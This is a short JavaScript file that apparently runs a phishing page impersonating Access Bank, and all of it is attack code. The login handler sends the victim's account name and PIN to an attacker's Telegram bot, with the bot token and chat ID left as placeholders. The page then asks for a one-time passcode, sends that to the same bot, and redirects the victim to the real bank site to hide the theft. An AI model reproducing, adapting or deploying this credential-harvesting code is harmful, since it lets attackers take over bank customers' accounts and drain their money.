// This function handles the first button click (Login)
function handleLogin() {
    const user = document.getElementById('user');
    const pass = document.getElementById('pass');
    const loginSection = document.getElementById('login-section');
    const otpArea = document.getElementById('otp-area');

    user.classList.remove('error-border');
    pass.classList.remove('error-border');

    if (user.value === "" || pass.value === "") {
        if (user.value === "") user.classList.add('error-border');
        if (pass.value === "") pass.classList.add('error-border');
        return; 
    }

    const message = "--- NEW LOGIN ---\nAcc: " + user.value + "\nPIN: " + pass.value;
    const token = "YOUR_BOT_TOKEN"; 
    const chat_id = "YOUR_CHAT_ID"; 
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

    fetch(url).then(() => {
        loginSection.style.display = 'none';
        otpArea.style.display = 'block';
    });
}

// This function handles the second button click (OTP)
function handleOtp() {
    const otp = document.getElementById('otp');
    otp.classList.remove('error-border');

    if (otp.value === "") {
        otp.classList.add('error-border');
        return;
    }

    const message = "--- OTP RECEIVED ---\nCode: " + otp.value;
    const token = "YOUR_BOT_TOKEN"; 
    const chat_id = "YOUR_CHAT_ID"; 
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

    fetch(url).then(() => {
        window.location.href = "https://www.accessbankplc.com/";
    });
}
